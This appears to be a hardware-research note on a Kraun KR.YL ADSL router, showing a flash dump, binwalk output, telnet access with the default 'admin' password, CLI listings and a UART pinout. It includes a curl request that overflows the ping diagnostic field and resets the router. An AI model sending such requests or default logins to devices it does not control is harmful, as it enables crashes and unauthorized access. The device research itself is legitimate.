# KRAUN KR.YL

[This](https://www.manualslib.com/manual/788619/Kraun-Wireless-Modem-Router-Adsl2-2Plus.html) seems to be the user manual.

The flash is recognized by flashrom (using hydrabus)

```
$ flashrom -p serprog:dev=/dev/ttyACM0 -r kr.yl.bin
flashrom v1.2 on Linux 5.10.0-1029-oem (x86_64)
flashrom is free software, get the source code at https://flashrom.org

Using clock_gettime for delay loops (clk_id: 1, resolution: 1ns).
serprog: Programmer name is "Hydrabus"
serprog: requested mapping AT45CS1282 is incompatible: 0x1080000 bytes at 0x00000000fef80000.
Found Eon flash chip "EN25F16" (2048 kB, SPI) on serprog.
 ...
Reading flash... done.
$ binwalk ~/kr.yl.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
65536         0x10000         ZyXEL rom-0 configuration block, name: "dbgarea", compressed size: 0, uncompressed size: 0, data offset from start of block: 16
131092        0x20014         ZyXEL rom-0 configuration block, name: "spt.dat", compressed size: 0, uncompressed size: 0, data offset from start of block: 16
131112        0x20028         ZyXEL rom-0 configuration block, name: "autoexec.net", compressed size: 25972, uncompressed size: 11886, data offset from start of block: 16
256048        0x3E830         ZyXEL rom-0 configuration block, name: "dbgarea", compressed size: 0, uncompressed size: 0, data offset from start of block: 16
256308        0x3E934         ZyXEL rom-0 configuration block, name: "dbgarea", compressed size: 0, uncompressed size: 0, data offset from start of block: 16
281651        0x44C33         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 66824 bytes
314644        0x4CD14         Unix path: /usr/share/tabset/vt100:\
315412        0x4D014         ZyXEL rom-0 configuration block, name: "spt.dat", compressed size: 0, uncompressed size: 0, data offset from start of block: 16
315432        0x4D028         ZyXEL rom-0 configuration block, name: "autoexec.net", compressed size: 25972, uncompressed size: 11886, data offset from start of block: 16
324610        0x4F402         GIF image data, version "89a", 200 x 50
332802        0x51402         GIF image data, version "89a", 560 x 50
438539        0x6B10B         Neighborly text, "neighbor of your ADSL Router that will forward the packet to the destination. On the LAN, the gateway </font>e destination. On the LAN, the gateway </font>"
516183        0x7E057         Copyright string: "Copyright (c) 2001 - 2011 CDC POINT S.p.a."
546867        0x85833         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 229804 bytes
612403        0x95833         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 3959684 bytes
```

It is possible to connect via ethernet cable

```
$ telnet 192.168.1.1
Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is '^]'.

Password: ********

Password: admin
Copyright (c) 2001 - 2011 CDC POINT S.p.a.

```

```
CDC> ?  
Valid commands are:
sys             exit            ether           wan               
ip              bridge          dot1q           pktqos            
show            set             lan                               
CDC>
```

```
CDC> sys
adjtime         countrycode     edit            feature           
hostname        log             resetlog        stdio             
time            syslog          version         view              
wdog            romreset        infohide        upnp              
atsh            diag            routeip         bridge            
save            display         password        default           
adminname       modelcheck      multiuser       defaultTCrestore  
pswauthen       hangdbg         pppnamelock     defaultpwdcheck   
fwuptimeout     sptromsize      compileid       dhcpprobe         
dhcpfor2ndusr   cwmp            socket          filter            
ddns            cpu             snmp                              
CDC>
```

```
CDC> sys version

 RAS version: 1.0.1 Build 110524 Rel.21843 
 System   ID: $2.12.17.0(RE9.C39)3.11.2.175 20100813_V002  [Aug 13 2010 14:04:29]
 romRasSize: 1351468 
 system up time:     0:10:32 (f6ed ticks)
 bootbase version: VTC_SPI1.11 | 2010/07/22
CDC>
```

This below resets the router

```
curl -i 'http://192.168.1.1/Forms/tools_test_1' -H 'Origin: http://192.168.1.1' -H 'Authorization: Basic YWRtaW46YWRtaW4=' -H 'Content-Type: application/x-www-form-urlencoded' --data 'Test_PVC=PVC0&PingIPAddr=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&pingflag=1&'
```

## UART

Connector ``J3``

```
VCC 4
GND 3
RX  2
TX  1
```
